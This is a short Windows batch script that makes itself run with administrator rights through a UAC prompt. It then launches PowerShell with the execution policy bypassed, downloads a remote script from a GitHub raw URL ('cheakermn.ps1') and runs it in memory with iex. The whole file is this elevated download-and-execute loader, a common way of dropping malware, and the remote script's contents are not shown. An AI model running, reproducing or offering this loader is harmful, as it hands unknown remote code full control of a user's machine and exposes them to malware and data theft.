@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

powershell -NoProfile -ExecutionPolicy Bypass -NoExit -Command "iex (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content"